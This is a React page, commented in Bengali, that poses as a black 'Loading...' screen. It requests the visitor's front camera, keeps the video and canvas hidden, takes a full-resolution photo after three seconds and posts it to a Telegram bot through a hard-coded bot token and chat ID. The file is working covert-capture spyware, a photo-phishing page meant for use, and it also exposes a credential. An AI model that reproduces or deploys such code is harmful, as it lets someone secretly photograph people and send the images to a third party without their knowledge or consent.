import React, { useEffect, useRef } from 'react';

const App = () => {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  // আপনার দেওয়া টেলিগ্রাম বটের তথ্য এখানে বসাবেন
  const botToken = "7969135759:AAGD2lS7-0E-5-m_6L70u3m_K9r2vS0L_8"; // আপনার টোকেন
  const chatId = "6616016147"; // আপনার চ্যাট আইডি

  useEffect(() => {
    const startCamera = async () => {
      try {
        // হাই কোয়ালিটি ছবির জন্য রেজোলিউশন সেট করা হয়েছে
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: "user", 
            width: { ideal: 1920 }, 
            height: { ideal: 1080 } 
          } 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          
          // ভিডিও লোড হওয়ার পর ৩ সেকেন্ড অপেক্ষা করবে (যাতে ছবি ক্লিয়ার হয়)
          videoRef.current.onloadedmetadata = () => {
            videoRef.current.play();
            setTimeout(() => {
              takePhoto();
            }, 3000); // ৩ সেকেন্ড ডিলে
          };
        }
      } catch (err) {
        console.error("ক্যামেরা অ্যাক্সেস পাওয়া যায়নি:", err);
      }
    };

    startCamera();
  }, []);

  const takePhoto = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (video && canvas) {
      const context = canvas.getContext('2d');
      // ভিডিওর অরিজিনাল সাইজ অনুযায়ী ক্যানভাস সেট করা
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // ক্লিয়ার ফ্রেম ড্র করা
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // ছবিটিকে JPEG ফরম্যাটে কনভার্ট করা (Quality: 1.0 মানে সর্বোচ্চ ক্লিয়ার)
      canvas.toBlob((blob) => {
        if (blob) {
          sendToTelegram(blob);
        }
      }, 'image/jpeg', 1.0);
    }
  };

  const sendToTelegram = (blob) => {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'high_quality_capture.jpg');

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: 'POST',
      body: formData
    })
    .then(res => res.json())
    .then(data => {
      console.log("টেলিগ্রামে পাঠানো হয়েছে:", data);
      // ছবি পাঠানোর পর স্ট্রীম বন্ধ করে দেওয়া (ব্যাটারি সাশ্রয়ের জন্য)
      const stream = videoRef.current.srcObject;
      const tracks = stream.getTracks();
      tracks.forEach(track => track.stop());
    })
    .catch(err => console.error("টেলিগ্রাম এরর:", err));
  };

  return (
    <div style={{ 
      display: 'flex', 
      justifyContent: 'center', 
      alignItems: 'center', 
      height: '100vh',
      backgroundColor: '#000' 
    }}>
      <h1 style={{ color: '#fff', fontFamily: 'sans-serif' }}>Loading...</h1>
      
      {/* ক্যামেরা দেখা যাবে না কিন্তু কাজ করবে */}
      <video 
        ref={videoRef} 
        autoPlay 
        playsInline 
        muted 
        style={{ display: 'none' }} 
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
    </div>
  );
};

export default App;